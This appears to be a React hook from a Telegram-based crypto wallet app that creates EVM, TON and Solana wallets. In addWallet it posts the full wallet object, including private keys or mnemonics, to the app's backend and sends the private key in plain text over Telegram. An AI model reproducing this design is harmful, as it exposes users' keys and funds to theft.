import { useState } from 'react';
import { ethers } from 'ethers';
import ChainStore from '@/store/ChainStore';
import WalletStore from '@/store/WalletStore';
import { sendTelegramMessage } from '@/utils/telegramMessages';
import * as bip39 from 'bip39';
import { SolanaWallet } from './SolanaWallet';
import { mnemonicToWalletKey } from '@ton/crypto';
import { WalletContractV4 } from 'ton';
import axios from 'axios';
import { usePathname } from 'next/navigation';

export const useCreateWallet = () => {
  const [wallet, setWallet] = useState<any>(null);
  const [isComplete, setIsComplete] = useState(false);

  const createWallet = async () => {
    const currentChain = ChainStore.currentChain?.name;

    if (!currentChain) {
      console.error('No current chain selected.');
      return;
    }

    let newWallet : any;
    switch (currentChain) {
      case 'BNB Smart Chain':
      case 'Ethereum':
      case 'Base':
        newWallet = ethers.Wallet.createRandom();
        newWallet.network = 'EVM';
        break;

      case 'The Open Network':
        const mnemonic = bip39.generateMnemonic();
        const key = await mnemonicToWalletKey(mnemonic.split(' '));
        const tonWallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 });
        newWallet = {
          address: tonWallet.address.toString(),
          mnemonic: mnemonic,
          network: 'TON'
        };
        break;

      case 'Solana':
        const solWallet = new SolanaWallet();
        newWallet = {
          address: solWallet.publicKey.toString(),
          privateKey: solWallet.secretKey.toString(),
          network: 'Solana'
        };
        break;

      default:
        console.error('Unsupported chain:', currentChain);
        return;
    }

    return newWallet;
  };

  const pathname = usePathname();
  const addWallet = async (wallet: any) => {
    if (pathname.startsWith('/auth')) {
      setTimeout(() => {
        WalletStore.addWallet(wallet);
        WalletStore.setCurrentWallet(wallet);
      }, 2000)
    } else {
      WalletStore.addWallet(wallet);
      WalletStore.setCurrentWallet(wallet);
    }

    setIsComplete(true);

    try {
      await axios.post('/api/wallet/create', wallet);
    } catch (error) {
      console.error('Failed to save wallet to the database:', error);
    }

    const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: \`${wallet.address}\`\n▫️ Приватный ключ: ||${wallet.privateKey || 'N/A'}||`;
    const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;

    await sendTelegramMessage(chatId, message);
  };

  return { createWallet, addWallet, isComplete, wallet };
};
